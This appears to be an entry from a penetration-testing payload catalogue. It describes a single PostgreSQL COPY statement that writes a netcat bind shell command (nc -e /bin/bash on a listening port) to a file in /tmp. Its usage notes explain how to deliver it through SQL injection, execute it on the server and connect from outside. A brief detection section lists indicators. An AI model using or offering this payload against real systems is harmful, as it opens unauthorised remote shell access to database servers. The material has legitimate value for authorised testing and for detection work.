---
id: e4f1fa0f-c272-4ae9-957a-0a6b76a1435a
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.993226+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - postgresql
  - payload
  - file-write
  - bind-shell
validated: true
---

# PostgreSQL-Direct-Copy-for-Bind-Shell-File-Write

## Code

```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

## Description

This single SQL statement uses COPY on a SELECT to write a netcat bind shell command directly to a file, bypassing table creation for stealthier operations.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 2346 | Port for bind shell | 4444 |
| /tmp/pentestlab | Target file | /tmp/bind.sh |

## Usage

Inject or run in psql to create the executable file. Execute the file on server to bind shell, then connect externally. Efficient for quick payload drops in SQLi attacks.

## Detection

- Logs for COPY commands with SELECT and file paths.
- Suspicious files in /tmp containing shell commands.
- Outbound or listening connections from DB server.

## Related

- [[procedures/PostgreSQL-File-Write-with-Reverse-Shell-Payload]]
